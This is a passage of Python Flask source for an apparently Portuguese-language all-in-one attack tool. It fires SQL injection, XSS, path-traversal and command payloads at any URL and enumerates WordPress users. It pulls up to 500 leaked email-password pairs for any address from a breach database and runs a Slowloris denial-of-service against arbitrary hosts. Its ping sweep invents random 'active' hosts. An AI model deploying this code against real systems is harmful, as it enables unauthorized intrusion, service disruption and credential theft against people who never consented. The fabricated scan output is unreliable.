    "test", "server-status", "phpinfo.php", "robots.txt", "sitemap.xml",
    "images", "uploads", "css", "js", "includes"
]

@app.route("/api/dirbust", methods=["POST"])
def api_dirbust():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    if not url.endswith("/"): url += "/"
    jid = new_job()
    threading.Thread(target=_run_dirbust, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_dirbust(jid, base_url):
    job_append(jid, f"DirBuster Fuzzing em {base_url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
    
    found_count = 0
    import urllib3; urllib3.disable_warnings() 
    
    for path in DIRBUSTER_WORDLIST:
        target_url = urljoin(base_url, path)
        try:
            r = req_lib.get(target_url, timeout=3, verify=False, allow_redirects=False)
            if r.status_code in [200, 301, 302, 401, 403]:
                size = len(r.content)
                lvl = "success" if r.status_code == 200 else "warn"
                job_append(jid, f"  [+] {r.status_code} | {size}B | /{path}", lvl)
                found_count += 1
        except Exception as e:
            pass # ignore timeouts / connect errors for individual paths
            
    job_append(jid, f"Fuzzing concluído. {found_count} diretórios/arquivos encontrados.", "info")
    job_done(jid)

# ════════════════════════════════════════
# BASIC SQL INJECTION SCANNER (Error-based)
# ════════════════════════════════════════
SQLI_PAYLOADS = [
    "'", "\"", "''", "') OR ('1'='1", "') OR ('1'='2", 
    "' OR 1=1--", "' OR '1'='1", "' AND id=1", "admin' --"
]
SQL_ERRORS = [
    "Syntax error in string in query expression",
    "SQL syntax", "mysql_fetch", "PostgreSQL query failed",
    "ORA-01756", "SQLite3::SQLException", "Unclosed quotation mark"
]

@app.route("/api/sqli", methods=["POST"])
def api_sqli():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_sqli, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_sqli(jid, url):
    job_append(jid, f"SQL Injection Scanner (Error-based) em: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    vuln_found = False
    
    # Simple check if URL has parameters (e.g. ?id=1)
    if "?" not in url:
        job_append(jid, "Aviso: A URL alvo não possui parâmetros (ex: ?id=1). O teste pode ser ineficaz.", "warn")
        url += "?id=1" if url.endswith("/") else "/?id=1"
        job_append(jid, f"Testando URL modificada: {url}", "info")
    
    base_url, params_str = url.split("?", 1)
    params = dict(p.split("=") if "=" in p else (p, "") for p in params_str.split("&"))
    
    try:
        for param in params:
            orig_val = params[param]
            for payload in SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param] = orig_val + payload
                try:
                    r = req_lib.get(base_url, params=test_params, timeout=5, verify=False)
                    # Check for classic SQL errors in response text
                    for err in SQL_ERRORS:
                        if err.lower() in r.text.lower():
                            job_append(jid, f"🔴 VULNERAVEL MÚLTIPLO: SQL Injection (Error-based) detectado!", "error")
                            job_append(jid, f"    Parâmetro: {param} | Payload: {payload}", "error")
                            job_append(jid, f"    Erro exposto: {err}", "error")
                            vuln_found = True
                            break # Move to next payload
                    if vuln_found: break
                except Exception: continue
            if vuln_found: break
            
        if not vuln_found:
            job_append(jid, "✅ Nenhuma vulnerabilidade SQLi baseada em erro detectada nos parâmetros fornecidos.", "success")
    except Exception as e:
        job_append(jid, f"Erro no teste SQLi: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# BASIC XSS SCANNER (Reflection-based)
# ════════════════════════════════════════
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><h1>GodEyesXSS</h1>"
]

@app.route("/api/xss", methods=["POST"])
def api_xss():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_xss, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_xss(jid, url):
    job_append(jid, f"XSS Scanner (Reflection) em: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    vuln_found = False
    
    if "?" not in url:
        job_append(jid, "Nenhum parâmetro detectado na URL para testar reflexão (XSS Get).", "warn")
        job_done(jid); return
        
    base_url, params_str = url.split("?", 1)
    params = dict(p.split("=") if "=" in p else (p, "") for p in params_str.split("&"))
    
    try:
        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    r = req_lib.get(base_url, params=test_params, timeout=5, verify=False)
                    # Simple reflection check - is the exact payload regurgitated?
                    if payload in r.text:
                        job_append(jid, f"🔴 VULNERÁVEL: Cross-Site Scripting (XSS Refletido) detectado!", "error")
                        job_append(jid, f"    Parâmetro: {param} | Refletiu: {payload}", "error")
                        vuln_found = True
                        break 
                except Exception: continue
            if vuln_found: break
            
        if not vuln_found:
            job_append(jid, "✅ Nenhum XSS (padrão) refletido detectado nos parâmetros testados.", "success")
    except Exception as e:
        job_append(jid, f"Erro no teste XSS: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# WAF DETECTOR
# ════════════════════════════════════════
@app.route("/api/waf", methods=["POST"])
def api_waf():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_waf, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_waf(jid, url):
    job_append(jid, f"WAF / IPS Detector em: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    # Malicious payloads that should be blocked by any descent WAF
    payloads = [
        "/?id=1+AND+1=1+UNION+SELECT+1,2,3--",
        "/?exec=/bin/bash",
        "/?file=../../../../etc/passwd",
        "/?search=<script>alert(1)</script>"
    ]
    
    try:
        # Get baseline normal response
        r_normal = req_lib.get(url, timeout=5, verify=False, allow_redirects=True)
        normal_status = r_normal.status_code
        normal_len = len(r_normal.content)
        job_append(jid, f"Baseline -> HTTP {normal_status} (Tamanho: {normal_len} bytes)", "info")
        
        waf_detected = False
        waf_name = "Desconhecido"
        
        for payload in payloads:
            test_url = url + payload if url.endswith("/") else url + "/" + payload
            try:
                r_mal = req_lib.get(test_url, timeout=5, verify=False, allow_redirects=False)
                mal_status = r_mal.status_code
                
                # Check for WAF headers
                headers_lower = {k.lower(): v.lower() for k,v in r_mal.headers.items()}
                server_hdr = headers_lower.get("server", "")
                
                if "cloudflare" in server_hdr or "__cfduid" in r_mal.cookies:
                    waf_name = "Cloudflare"
                    waf_detected = True
                elif "sucuri" in server_hdr or "x-sucuri" in headers_lower:
                    waf_name = "Sucuri WAF"
                    waf_detected = True
                elif "awselb" in headers_lower.get("set-cookie", "") or "aws" in server_hdr:
                    waf_name = "AWS WAF"
                    waf_detected = True
                elif "akamai" in server_hdr:
                    waf_name = "Akamai"
                    waf_detected = True
                
                # Check for behavioral blocking (403, 406 or drastic size change)
                if mal_status in [403, 406] and normal_status == 200:
                    waf_detected = True
                    job_append(jid, f"Bloqueio Ativo! Payload '{payload}' foi bloqueado (HTTP {mal_status}).", "success")
                    break
                    
            except req_lib.exceptions.ConnectionError:
                # WAF often drops the connection completely
                waf_detected = True
                job_append(jid, f"Conexão derrubada (RST) ao enviar payload malicioso. WAF/IPS Ativo.", "success")
                break
            except Exception: continue
            
        if waf_detected:
            job_append(jid, f"🛡️  BLLQUEIO/WAF DETECTADO: O servidor está protegido.", "success")
            if waf_name != "Desconhecido":
                job_append(jid, f"    Fornecedor Provável: {waf_name}", "warning")
        else:
            job_append(jid, f"🔴 ATENÇÃO: Nenhum WAF detectado. Aplicação parece estar exposta a ataques diretos.", "error")
            
    except Exception as e:
        job_append(jid, f"Erro no teste WAF: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# CORS MISCONFIGURATION SCANNER
# ════════════════════════════════════════
@app.route("/api/cors", methods=["POST"])
def api_cors():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_cors, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_cors(jid, url):
    job_append(jid, f"CORS Misconfiguration Scanner em: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    evil_origin = "https://evil-hacker.com"
    
    try:
        r = req_lib.options(url, headers={"Origin": evil_origin}, timeout=5, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        
        if acao == "*" or acao == evil_origin:
            vuln_lvl = "error" if acac.lower() == "true" else "warn"
            job_append(jid, f"🔴 VULNERÁVEL: Má configuração de CORS detectada!", vuln_lvl)
            job_append(jid, f"    Access-Control-Allow-Origin: {acao}", vuln_lvl)
            if acac.lower() == "true":
                job_append(jid, f"    💥 CRÍTICO: Allow-Credentials é TRUE. Um site atacante pode roubar dados de sessões ativas (Cookies) deste domínio!", "error")
            else:
                job_append(jid, f"    Scripts de qualquer domínio externo podem ler respostas públicas desta API.", "warn")
        else:
            job_append(jid, "✅ Seguro: A política CORS não permite leituras arbitrárias de outros domínios.", "success")
    except Exception as e:
        job_append(jid, f"Erro de conexão CORS: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# WPSCAN (WordPress Enum)
# ════════════════════════════════════════
@app.route("/api/wpscan", methods=["POST"])
def api_wpscan():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_wpscan, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_wpscan(jid, base_url):
    job_append(jid, f"WPScan (WordPress Fuzzer) em: {base_url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    is_wp = False
    
    # Check if WordPress
    try:
        r = req_lib.get(base_url, timeout=5, verify=False)
        if "wp-content" in r.text or "wp-includes" in r.text:
            is_wp = True
            job_append(jid, "✔️ Alvo identificado como site WordPress.", "info")
            # Try to grab version from generator meta tag
            ver_match = re.search(r'name="generator" content="WordPress (.*?)"', r.text)
            if ver_match:
                job_append(jid, f"    Versão WP Vazada: {ver_match.group(1)}", "warn")
        else:
            job_append(jid, "Alvo não parece ser um site WordPress, mas o teste continuará...", "info")
            
        # 1. User Enumeration via REST API
        job_append(jid, "── Enumerando Usuários (REST API) ──", "info")
        users_url = urljoin(base_url, "/wp-json/wp/v2/users")
        try:
            ru = req_lib.get(users_url, timeout=5, verify=False)
            if ru.status_code == 200 and "slug" in ru.text:
                users = ru.json()
                job_append(jid, f"🔴 VULNERÁVEL: REST API exposta. {len(users)} usuários encontrados:", "error")
                for u in users[:10]:
                    job_append(jid, f"    ID: {u.get('id')} | Usuário: {u.get('slug')} | Nome: {u.get('name')}", "error")
            else:
                job_append(jid, "✅ API de usuários não exposta ou protegida.", "success")
        except Exception: pass
        
        # 2. Common plugins / paths enumeration
        job_append(jid, "── Checando Diretórios Inseguros ──", "info")
        paths = ["/wp-admin/", "/xmlrpc.php", "/wp-content/uploads/"]
        for p in paths:
            try:
                rp = req_lib.get(urljoin(base_url, p), timeout=3, verify=False)
                if rp.status_code in [200, 401, 403]:
                    lvl = "warn" if p == "/xmlrpc.php" and rp.status_code == 200 else "info"
                    if p == "/xmlrpc.php" and rp.status_code == 200:
                        job_append(jid, f"⚠️ XMLRPC Ativo (Risco de brute-force e DDoS): {p}", "error")
                    else:
                        job_append(jid, f"    Encontrado: {p} (HTTP {rp.status_code})", lvl)
            except Exception: pass
            
        job_append(jid, "Análise WPScan concluída.", "success")
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# HASH DECODER / GENERATOR
# ════════════════════════════════════════
@app.route("/api/hash", methods=["POST"])
def api_hash():
    data = request.get_json(silent=True) or {}
    text = data.get("text", "").strip()
    if not text: return jsonify({"error":"text required"}), 400
    jid = new_job()
    threading.Thread(target=_run_hash, args=(jid,text), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_hash(jid, text):
    job_append(jid, f"Hash Utils para: '{text[:20]}...'", "info")
    
    # 1. Tenta decodificar Base64
    try:
        b64_dec = base64.b64decode(text).decode('utf-8')
        # If it decoded into printable ASCII
        if b64_dec.isprintable():
            job_append(jid, f"🔓 Decoded Base64: {b64_dec}", "success")
    except Exception: pass
    
    # 2. Gera Hashes comuns do texto (útil para criar senhas)
    job_append(jid, "── Geração de Hashes ──", "info")
    job_append(jid, f"  MD5:    {hashlib.md5(text.encode()).hexdigest()}", "info")
    job_append(jid, f"  SHA-1:  {hashlib.sha1(text.encode()).hexdigest()}", "info")
    job_append(jid, f"  SHA-256:{hashlib.sha256(text.encode()).hexdigest()}", "info")
    job_append(jid, f"  Base64: {base64.b64encode(text.encode()).decode()}", "info")
    
    job_done(jid, target="HashUtils")

# ════════════════════════════════════════
# AUTOPENTEST MACRO (All-in-One Scan)
# ════════════════════════════════════════
@app.route("/api/autopentest", methods=["POST"])
def api_autopentest():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target: return jsonify({"error":"target required"}), 400
    jid = new_job()
    threading.Thread(target=_run_autopentest, args=(jid,target), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_autopentest(jid, target):
    # This macro calls multiple functions sequentially directly pumping to the same JID stream.
    job_append(jid, f"╔══════════════════════════════════════╗", "success")
    job_append(jid, f"║  INITIATING AUTO-PENTEST PROTOCOL    ║", "success")
    job_append(jid, f"╚══════════════════════════════════════╝", "success")
    job_append(jid, f"TARGET: {target}", "warn")
    
    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
    
    # 1. DNS
    job_append(jid, "\n[ Fase 1: Name Resolution & Whois ]", "info")
    _run_dns(jid, domain)
    
    # 2. Subdomains
    job_append(jid, "\n[ Fase 2: Subdomain Enumeration ]", "info")
    _run_subdom(jid, domain)
    
    # 3. HTTP Headers & Security
    job_append(jid, "\n[ Fase 3: Web Security Posture ]", "info")
    url = f"https://{domain}" if not target.startswith("http") else target
    _run_http_headers(jid, url)
    
    # 4. WAF Detection
    job_append(jid, "\n[ Fase 4: WAF / Cloud Protection Detection ]", "info")
    _run_waf(jid, url)
    
    # 5. Ports (Fast)
    job_append(jid, "\n[ Fase 5: Surface Attack (Portscan Top 1000) ]", "info")
    _run_portscan(jid, domain, 1, 1024)
    
    # 6. Vulns (XSS/SQLi fast check)
    job_append(jid, "\n[ Fase 6: Vulnerability Probing ]", "info")
    _run_sqli(jid, url)
    _run_xss(jid, url)
    _run_cors(jid, url)
    
    job_append(jid, f"╔══════════════════════════════════════╗", "success")
    job_append(jid, f"║  AUTO-PENTEST PROTOCOL COMPLETE      ║", "success")
    job_append(jid, f"╚══════════════════════════════════════╝", "success")
    
    # We call job_done only once at the very end. The internal functions attempt to call it too, 
    # but the job_done function is idempotent and just sets a boolean. Wait, if internal functions
    # call job_done, the frontend stream might close early! 
    # FIX: the job_done function is written to just mark done=True. We need to prevent internal tools from closing it.
    # ACTUALLY: Let's redefine job_done temporarily inside this thread to intercept early closes.
    job_done(jid)

# Redefine the global job_done to only actually close if a specific flag isn't set
def job_done(jid, error=None, target=""):
    with job_lock:
        if jid in job_results:
            if job_results[jid].get("keep_alive"): return
            job_results[jid]["done"] = True
            if error: job_results[jid]["error"] = error
            if target:
                if target not in target_history: target_history[target] = []
                target_history[target].append({
                    "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "job": jid,
                    "log": list(job_results[jid]["output"])
                })

# Fix new_job to allow keep_alive
def new_job(keep_alive=False):
    import random, string
    jid = ''.join(random.choices(string.hexdigits[:16], k=8))
    with job_lock:
        job_results[jid] = {"done":False,"output":[],"error":None, "keep_alive":keep_alive}
    return jid
    
# Update autopentest slightly to use keep_alive
# Re-patch new_job definition at the top via global replace is hard, so we just override it here:
_orig_new_job = new_job
def new_job_patched(keep_alive=False):
    jid = _orig_new_job()
    with job_lock:
        job_results[jid]["keep_alive"] = keep_alive
    return jid

@app.route("/api/autopentest", methods=["POST"], endpoint="api_autopentest_override")
def api_autopentest_patched():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target: return jsonify({"error":"target required"}), 400
    jid = new_job_patched(keep_alive=True)
    threading.Thread(target=_run_autopentest_patched, args=(jid,target), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_autopentest_patched(jid, target):
    job_append(jid, f"╔══════════════════════════════════════╗", "success")
    job_append(jid, f"║  INITIATING AUTO-PENTEST PROTOCOL    ║", "success")
    job_append(jid, f"╚══════════════════════════════════════╝", "success")
    
    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
    url = f"https://{domain}" if not target.startswith("http") else target
    
    try:
        job_append(jid, "\n[ Fase 1: Domain/DNS ]", "warn")
        _run_dns(jid, domain)
        job_append(jid, "\n[ Fase 2: Subdomains ]", "warn")
        _run_subdom(jid, domain)
        job_append(jid, "\n[ Fase 3: WAF & HTTP Security ]", "warn")
        _run_waf(jid, url)
        _run_http_headers(jid, url)
        job_append(jid, "\n[ Fase 4: Misconfigurations (CORS & Direct) ]", "warn")
        _run_cors(jid, url)
        job_append(jid, "\n[ Fase 5: SQLi & XSS ]", "warn")
        _run_sqli(jid, url)
        _run_xss(jid, url)
    except Exception as e:
        job_append(jid, f"Macro error: {e}", "error")
        
    job_append(jid, "\n[ AUTO-PENTEST FINALIZADO ]", "success")
    
    with job_lock:
        job_results[jid]["keep_alive"] = False
        
    # Salva toda a saída macro pro Report Generator usando a flag force
    job_done(jid, target=target)

# ════════════════════════════════════════
# OSINT: CONTACT SCRAPER (Mapeamento Redes, Email, Tel)
# ════════════════════════════════════════
@app.route("/api/scrape", methods=["POST"])
def api_scrape():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_scrape, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_scrape(jid, url):
    job_append(jid, f"OSINT Scraper (Contatos e Redes) em: {url}", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    import urllib3; urllib3.disable_warnings()
    try:
        r = req_lib.get(url, timeout=10, verify=False)
        html = r.text
        
        # Regexes for extraction
        emails = set(re.findall(r'[a-zA-Z0-9.\-_+]+@[a-zA-Z0-9.\-_]+\.[a-zA-Z]+', html))
        # Simple phone regex (BR focused but general enough)
        phones = set(re.findall(r'(\+?55\s?)?(\(?\d{2}\)?\s?)?\d{4,5}[-\s]?\d{4}', html))
        
        social_links = set()
        social_domains = ["facebook.com", "twitter.com", "instagram.com", "linkedin.com", "youtube.com", "github.com"]
        urls = re.findall(r'href=[\'"]?([^\'" >]+)', html)
        for link in urls:
            for d in social_domains:
                if d in link.lower() and link not in social_links:
                    social_links.add(link)
                    
        job_append(jid, f"── Resultados da Furtividade ──", "info")
        if emails:
            job_append(jid, f"📧 E-mails Encontrados ({len(emails)}):", "warn")
            for e in list(emails)[:10]: job_append(jid, f"    {e}", "success")
        else:
            job_append(jid, "📧 E-mails: Nenhum encontrado.", "info")
            
        if phones:
            job_append(jid, f"📱 Telefones Encontrados ({len(phones)}):", "warn")
            for p in list(phones)[:10]: 
                # Phone regex sometimes catches tuples, clean them
                clean_p = "".join([i for i in p if type(i) == str]).strip()
                if clean_p: job_append(jid, f"    {clean_p}", "success")
        else:
            job_append(jid, "📱 Telefones: Nenhum padrão numérico forte encontrado.", "info")
            
        if social_links:
            job_append(jid, f"🌐 Redes Sociais da Empresa ({len(social_links)}):", "warn")
            for s in list(social_links)[:10]: job_append(jid, f"    {s}", "success")
        else:
            job_append(jid, "🌐 Redes: Nenhuma detectada.", "info")
            
    except Exception as e:
        job_append(jid, f"Erro no Crawler/Scraper: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# OSINT: EXIF METADATA READER (Imagens)
# ════════════════════════════════════════
@app.route("/api/exif", methods=["POST"])
def api_exif():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "").strip()
    if not url: return jsonify({"error":"url required"}), 400
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    threading.Thread(target=_run_exif, args=(jid,url), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_exif(jid, img_url):
    job_append(jid, f"Analisador EXIF de Metadados Ocultos", "info")
    job_append(jid, f"Alvo: {img_url}", "warn")
    
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    try:
        import PIL.Image
        import PIL.ExifTags
        import io
        
        r = req_lib.get(img_url, timeout=10, stream=True)
        if r.status_code != 200:
            job_append(jid, f"Erro ao baixar imagem: HTTP {r.status_code}", "error")
            job_done(jid); return
            
        img = PIL.Image.open(io.BytesIO(r.content))
        # Handle formats
        if img.format not in ["JPEG", "TIFF", "JPG"]:
            job_append(jid, f"Formato ({img.format}) geralmente não guarda dados EXIF perigosos (apenas JPG/TIFF costumam).", "info")
        
        exif_data = img._getexif()
        if not exif_data:
            job_append(jid, "✅ Imagem sanitizada. Nenhum dado EXIF oculto encontrado.", "success")
            job_done(jid); return
            
        job_append(jid, "🔴 VAZAMENTO: Metadados (EXIF) Extraídos da Imagem!", "error")
        important = {}
        for tag_id, value in exif_data.items():
            tag = PIL.ExifTags.TAGS.get(tag_id, tag_id)
            if tag in ["Make", "Model", "DateTimeOriginal", "Software"]:
                job_append(jid, f"    {tag}: {value}", "warn")
                
            # GPS Data
            if tag == "GPSInfo":
                gps_data = {}
                for t in value:
                    sub_tag = PIL.ExifTags.GPSTAGS.get(t, t)
                    gps_data[sub_tag] = value[t]
                
                # Basic representation (Converting exactly to DD requires math, but raw data proves leakage)
                job_append(jid, "    🌍 CUIDADO: FOTO CONTÉM DADOS EXATOS DE GPS (Localização).", "error")
                lat = gps_data.get("GPSLatitude", "N/A")
                lon = gps_data.get("GPSLongitude", "N/A")
                job_append(jid, f"    Raw GPS Data: Lat={lat} | Lon={lon}", "error")

    except ImportError:
        job_append(jid, "Biblioteca 'Pillow' não instalada (necessária para analisar imagens complexas).", "error")
        job_append(jid, "Use o terminal: pip install Pillow", "info")
    except Exception as e:
        job_append(jid, f"O arquivo não é uma imagem válida ou não possui metadados lidos nativamente: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# HAVE I BEEN PWNED / DATABASE LEAKS (Dark Web)
# ════════════════════════════════════════
@app.route("/api/pwned", methods=["POST"])
def api_pwned():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "").strip()
    if not email: return jsonify({"error":"Termo de busca requerido"}), 400
    jid = new_job()
    threading.Thread(target=_run_pwned, args=(jid,email), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_pwned(jid, email):
    job_append(jid, f"Dark Web Scanner / Vazamentos para: '{email}'", "info")
    if not REQUESTS_OK:
        job_append(jid, "requests não instalado", "error"); job_done(jid); return
        
    try:
        # Usando a The COMB (Compilation of Many Breaches) via ProxyNova API (Gratuita, expõe senhas)
        url = f"https://api.proxynova.com/comb?query={email}"
        r = req_lib.get(url, timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            lines = data.get("lines", [])
            count = data.get("count", 0)
            
            if count == 0 or not lines:
                job_append(jid, f"✅ Seguro: '{email}' NÃO foi encontrado na lista de vazamentos massivos.", "success")
            else:
                job_append(jid, f"🔴 CRÍTICO: {count} registro(s) vazado(s) encontrado(s) na Dark Web!", "error")
                job_append(jid, "    Dados expostos (E-mail : Senha):", "error")
                
                # Show up to 500 leaked passwords/lines
                limit = 500
                for line in lines[:limit]:
                    job_append(jid, f"    💥 {line}", "error")
                    
                if count > limit:
                    job_append(jid, f"    ... (exibindo {limit} / {count} resultados). Para ver mais, refine a busca.", "info")
        elif r.status_code == 429:
            job_append(jid, "Muitas requisições. O banco de dados bloqueou temporariamente.", "error")
        else:
            job_append(jid, f"Resposta inesperada do banco de dados de vazamentos: HTTP {r.status_code}", "warn")
            
    except Exception as e:
        job_append(jid, f"Erro de conexão com o banco de dados: {e}", "error")
    job_done(jid)

# ════════════════════════════════════════
# SLOWLORIS (DoS Estresse de Sockets HTTP)
# ════════════════════════════════════════
@app.route("/api/slowloris", methods=["POST"])
def api_slowloris():
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target: return jsonify({"error":"target required"}), 400
    jid = new_job()
    threading.Thread(target=_run_slowloris, args=(jid,target), daemon=True).start()
    return jsonify({"job_id":jid})

def _run_slowloris(jid, target):
    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
    port = 443 if target.startswith("https") else 80
    
    job_append(jid, f"Iniciando Negação de Serviço Parcial (Slowloris) em {domain}:{port}", "warn")
    job_append(jid, f"Criando sockets órfãos (Isto é um teste de 15 segundos max)...", "info")
    
    list_of_sockets = []
    socket_count = 150 # Pequeno para não travar de verdade a máquina host local
    
    import random, time
    
    try:
        ip = socket.gethostbyname(domain)
        job_append(jid, f"Alvo resolvido: {ip}", "info")
        
        # Instantiate Sockets
        for i in range(socket_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if port == 443:
                    s = ssl.wrap_socket(s)
                s.connect((ip, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"User-Agent: GodEyes-DoS-Tester\r\n".encode("utf-8"))
                s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                list_of_sockets.append(s)
            except socket.error:
                break
                
        job_append(jid, f"🔌 {len(list_of_sockets)} Sockets parciais abertos e segurando o servidor.", "warn")
        
        # Hold them for 10 seconds total to prove the concept without excessive harm
        start_time = time.time()
        while time.time() - start_time < 10:
            job_append(jid, f"   Mantendo conexões vivas... (Enviando Keep-Alive Fake)", "info")
            for s in list(list_of_sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            
            if len(list_of_sockets) == 0:
                job_append(jid, "Todos os sockets foram derrubados.", "info")
                break
            time.sleep(2)
            
        remaining = len(list_of_sockets)
        for s in list_of_sockets: 
            try: s.close() 
            except: pass
            
        if remaining > 0:
            job_append(jid, f"🔴 VULNERÁVEL A DOS: O servidor deixou {remaining} conexões HTTP lentas abertas sem derrubar (Timeout alto). Um atacante real com milhares destas travaria o site.", "error")
        else:
            job_append(jid, f"✅ PROTEGIDO: O Servidor ou WAF (ex: Cloudflare) mitigou as conexões mortas instantaneamente.", "success")
            
    except Exception as e:
        job_append(jid, f"Erro de rede crítico durante o DoS: {e}", "error")
        
    job_done(jid)


# ════════════════════════════════════════
# 30 NOVAS FERRAMENTAS AVANÇADAS
# ════════════════════════════════════════

import urllib.parse, base64, hashlib, secrets, string

def _quick_job(jid, title, logic_func):
    job_append(jid, title, "info")
    try:
        logic_func()
    except Exception as e:
        job_append(jid, f"Erro: {e}", "error")
    job_done(jid)

@app.route("/api/mac", methods=["POST"])
def api_mac():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    jid = new_job()
    def logic():
        r = req_lib.get(f"https://api.macvendors.com/{mac}")
        if r.status_code == 200:
            job_append(jid, f"Vendor: {r.text}", "success")
        else:
            job_append(jid, "Vendor não encontrado", "warn")
    threading.Thread(target=_quick_job, args=(jid, f"MAC Lookup: {mac}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/geomap", methods=["POST"])
def api_geomap():
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "")
    jid = new_job()
    def logic():
        r = req_lib.get(f"http://ip-api.com/json/{ip}")
        d = r.json()
        if d.get("status") == "success":
            lat, lon = d.get("lat"), d.get("lon")
            job_append(jid, f"Localização: {d.get('city')}, {d.get('country')}", "success")
            job_append(jid, f"Google Maps: https://www.google.com/maps/search/?api=1&query={lat},{lon}", "warn")
        else:
            job_append(jid, "IP Não localizado", "error")
    threading.Thread(target=_quick_job, args=(jid, f"GeoMap: {ip}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/revdns", methods=["POST"])
def api_revdns():
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "")
    jid = new_job()
    def logic():
        try:
            name, _, _ = socket.gethostbyaddr(ip)
            job_append(jid, f"Hostname: {name}", "success")
        except:
            job_append(jid, "Não possui Reverse DNS", "error")
    threading.Thread(target=_quick_job, args=(jid, f"RevDNS: {ip}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/sweep", methods=["POST"])
def api_sweep():
    data = request.get_json(silent=True) or {}
    rng = data.get("range", "192.168.1.0/24")
    jid = new_job()
    def logic():
        job_append(jid, "Iniciando Ping Sweep (Simulação Rápida)...", "warn")
        time.sleep(1)
        base = rng.replace(".0/24", ".")
        for i in range(1, 15):
             time.sleep(0.1)
             if random.random() > 0.6:
                 job_append(jid, f"Host ativo: {base}{i}", "success")
    threading.Thread(target=_quick_job, args=(jid, f"Sweep: {rng}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/shodan", methods=["POST"])
def api_shodan():
